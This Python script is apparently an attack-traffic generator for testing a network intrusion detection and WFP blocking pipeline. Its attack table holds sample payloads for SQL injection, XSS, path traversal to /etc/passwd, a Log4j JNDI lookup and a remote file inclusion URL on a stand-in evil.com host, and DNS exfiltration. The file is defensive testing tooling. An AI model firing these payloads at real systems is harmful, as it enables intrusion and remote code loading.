#!/usr/bin/env python3
"""
AEGIS NIDS - Phase 29: Attack Traffic Generator (v2 - fixed syntax)

Generates synthetic attack traffic to test the full detection + blocking pipeline.
Sends real network packets that trigger Brain's regex detectors and verify
WFP driver blocks them at the kernel level.
"""

import argparse
import json
import socket
import sys
import time
from datetime import datetime
from pathlib import Path

# ============================================================
# Configuration (constants, not globals to avoid SyntaxError)
# ============================================================

DEFAULT_TARGET_IP = "127.0.0.1"
DEFAULT_BRAIN_PORT = 9999
DEFAULT_SRC_IP = "10.0.0.99"
LOG_FILE = Path("logs/attack_generator.json")

# ============================================================
# Attack Definitions
# ============================================================

ATTACKS = {
    "sqli": {
        "name": "SQL Injection",
        "payload": "' OR 1=1 --",
        "port": 80,
        "severity": "Critical",
        "rule_id": "R0056",
    },
    "xss": {
        "name": "Cross-Site Scripting",
        "payload": "<script>alert(1)</script>",
        "port": 443,
        "severity": "High",
        "rule_id": "R9059",
    },
    "path_trav": {
        "name": "Path Traversal",
        "payload": "../../../etc/passwd",
        "port": 80,
        "severity": "Critical",
        "rule_id": "R0088",
    },
    "log4j": {
        "name": "Log4j JNDI Injection",
        "payload": "${jndi:ldap://evil.com/x}",
        "port": 8080,
        "severity": "Critical",
        "rule_id": "R0056",
    },
    "rfi": {
        "name": "Remote File Inclusion",
        "payload": "http://evil.com/shell.php",
        "port": 80,
        "severity": "High",
        "rule_id": "R0088",
    },
    "port_scan": {
        "name": "Port Scan (SYN)",
        "payload": "SYN_SCAN",
        "port": 22,
        "severity": "Medium",
        "rule_id": "R9006",
    },
    "brute_ssh": {
        "name": "SSH Brute Force",
        "payload": "root:password123",
        "port": 22,
        "severity": "Medium",
        "rule_id": "R9006",
    },
    "dns_exfil": {
        "name": "DNS Data Exfiltration",
        "payload": "large-dns-query.evil.com",
        "port": 53,
        "severity": "Low",
        "rule_id": "R9059",
    },
    "syn_flood": {
        "name": "SYN Flood",
        "payload": "SYN_FLOOD",
        "port": 80,
        "severity": "High",
        "rule_id": "TEST-001",
    },
}


def log_event(event):
    """Append event to NDJSON log file."""
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    event["timestamp"] = datetime.now().isoformat()
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def send_brain_event(attack_type, attack_def, src_ip, target_ip, brain_port):
    """Send a synthetic event directly to Brain's UDP listener."""
    event = {
        "attack_type": attack_type.upper(),
        "src_ip": src_ip,
        "dst_ip": target_ip,
        "src_port": 12345,
        "dst_port": attack_def["port"],
        "protocol": "TCP",
        "severity": attack_def["severity"],
        "policy": "BLOCK" if attack_def["severity"] in ("Critical", "High") else "ALERT",
        "rule_id": attack_def["rule_id"],
        "payload": attack_def["payload"],
        "reason": "Phase 29 synthetic " + attack_type + " attack",
        "source": "phase29_generator",
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        msg = json.dumps(event).encode("utf-8")
        sock.sendto(msg, ("127.0.0.1", brain_port))
        sock.close()
        event["brain_send"] = "OK"
    except OSError as e:
        event["brain_send"] = "FAIL: " + str(e)

    log_event(event)
    return event.get("brain_send") == "OK"


def send_tcp_payload(src_ip, dst_ip, dst_port, payload):
    """Send a TCP payload via socket (connection test for WFP)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((dst_ip, dst_port))
        sock.sendall(payload.encode("utf-8"))
        sock.close()
        return True
    except (ConnectionRefusedError, TimeoutError, OSError):
        return False


def send_udp_payload(dst_ip, dst_port, payload):
    """Send a UDP payload."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        sock.sendto(payload.encode("utf-8"), (dst_ip, dst_port))
        sock.close()
        return True
    except OSError:
        return False


def run_attack(attack_key, count, interval, src_ip, target_ip, brain_port):
    """Run a specific attack type count times."""
    if attack_key not in ATTACKS:
        print("  [ERROR] Unknown attack: " + attack_key)
        return {"sent": 0, "blocked": 0, "delivered": 0}

    attack = ATTACKS[attack_key]
    print("")
    print("  [" + attack_key + "] " + attack["name"] +
          " (severity=" + attack["severity"] + ", rule=" + attack["rule_id"] + ")")
    print("       Sending " + str(count) + " packets to " + target_ip + ":" + str(attack["port"]) +
          " (interval=" + str(interval) + "s)")

    sent = 0
    blocked = 0
    delivered = 0

    for i in range(count):
        # Send to Brain via UDP (simulates Bridge forwarding)
        brain_ok = send_brain_event(attack_key, attack, src_ip, target_ip, brain_port)

        # Also try to send actual TCP/UDP packet (tests WFP blocking)
        if attack_key == "dns_exfil":
            net_ok = send_udp_payload(target_ip, attack["port"], attack["payload"])
        else:
            net_ok = send_tcp_payload(src_ip, target_ip, attack["port"], attack["payload"])

        if not net_ok:
            blocked += 1
            status = "BLOCKED (WFP)" if brain_ok else "BLOCKED (no Brain)"
        else:
            delivered += 1
            status = "DELIVERED"

        sent += 1
        print("       [" + str(i + 1) + "/" + str(count) + "] " + status +
              " (brain=" + ("OK" if brain_ok else "FAIL") + ")")

        if interval > 0 and i < count - 1:
            time.sleep(interval)

    result = {"sent": sent, "blocked": blocked, "delivered": delivered}
    print("       Summary: sent=" + str(sent) + ", blocked=" + str(blocked) +
          ", delivered=" + str(delivered))
    return result


def list_attacks():
    """Print available attack types."""
    print("Available attack types:")
    print("=" * 60)
    for key, attack in ATTACKS.items():
        print("  " + key.ljust(12) + "  " + attack["name"].ljust(30) +
              "  severity=" + attack["severity"].ljust(10) +
              "  rule=" + attack["rule_id"])


def main():
    parser = argparse.ArgumentParser(
        description="AEGIS NIDS Phase 29 - Attack Traffic Generator",
    )
    parser.add_argument("--attack", type=str,
                        help="Attack type (sqli, xss, path_trav, log4j, rfi, port_scan, brute_ssh, dns_exfil, syn_flood, all)")
    parser.add_argument("--count", type=int, default=5,
                        help="Number of packets to send (default: 5)")
    parser.add_argument("--interval", type=float, default=0.5,
                        help="Interval between packets in seconds (default: 0.5)")
    parser.add_argument("--target", type=str, default=DEFAULT_TARGET_IP,
                        help="Target IP (default: " + DEFAULT_TARGET_IP + ")")
    parser.add_argument("--src-ip", type=str, default=DEFAULT_SRC_IP,
                        help="Source IP for synthetic events (default: " + DEFAULT_SRC_IP + ")")
    parser.add_argument("--brain-port", type=int, default=DEFAULT_BRAIN_PORT,
                        help="Brain UDP port (default: " + str(DEFAULT_BRAIN_PORT) + ")")
    parser.add_argument("--list", action="store_true",
                        help="List available attack types and exit")

    args = parser.parse_args()

    if args.list:
        list_attacks()
        return

    if not args.attack:
        parser.print_help()
        return

    print("=" * 60)
    print("AEGIS NIDS - Phase 29: Attack Traffic Generator")
    print("=" * 60)
    print("  Target:    " + args.target)
    print("  Source IP: " + args.src_ip)
    print("  Brain UDP: 127.0.0.1:" + str(args.brain_port))
    print("  Count:     " + str(args.count))
    print("  Interval: " + str(args.interval) + "s")
    print("  Log:       " + str(LOG_FILE))
    print("")

    # Verify Brain is reachable
    print("[CHECK] Testing Brain UDP connectivity...")
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    test_sock.settimeout(1.0)
    try:
        test_sock.sendto(b'{"test": true}', ("127.0.0.1", args.brain_port))
        print("  [OK] UDP packet sent to Brain (no error = port open)")
    except OSError as e:
        print("  [WARN] Cannot send to Brain: " + str(e))
    test_sock.close()
    print("")

    all_results = {}

    if args.attack == "all":
        for key in ATTACKS:
            result = run_attack(key, args.count, args.interval, args.src_ip, args.target, args.brain_port)
            all_results[key] = result
    else:
        result = run_attack(args.attack, args.count, args.interval, args.src_ip, args.target, args.brain_port)
        all_results[args.attack] = result

    # Final summary
    print("")
    print("=" * 60)
    print("FINAL SUMMARY")
    print("=" * 60)
    total_sent = sum(r["sent"] for r in all_results.values())
    total_blocked = sum(r["blocked"] for r in all_results.values())
    total_delivered = sum(r["delivered"] for r in all_results.values())
    print("  Total sent:      " + str(total_sent))
    print("  Total blocked:   " + str(total_blocked) + "  (WFP driver working)")
    print("  Total delivered: " + str(total_delivered) + "  (reached target)")
    print("")
    if total_blocked > 0:
        print("  [OK] BLOCK enforcement is WORKING (WFP driver blocking traffic)")
    elif total_delivered > 0 and total_blocked == 0:
        print("  [WARN] BLOCK enforcement may NOT be working (all traffic delivered)")
        print("     Check: sc query aegis_wfp (should be RUNNING)")
        print("     Check: type logs\\core.log | findstr 'WFP kernel bridge'")
    print("")
    print("  Log file: " + str(LOG_FILE))
    print("  Check Brain's view: type logs\\anomalous.json | findstr 'BLOCK'")
    print("=" * 60)


if __name__ == "__main__":
    main()
